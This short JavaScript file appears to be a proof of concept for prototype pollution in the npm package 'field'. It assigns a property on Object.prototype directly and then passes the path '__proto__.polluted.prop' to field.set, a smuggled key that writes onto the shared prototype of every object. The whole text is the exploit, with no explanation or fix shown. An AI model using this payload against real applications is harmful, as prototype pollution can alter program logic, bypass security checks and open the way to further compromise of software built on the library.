var field = require('field')

Object.prototype._polluted = 1;
field.set({}, '__proto__.polluted.prop', 'yes')
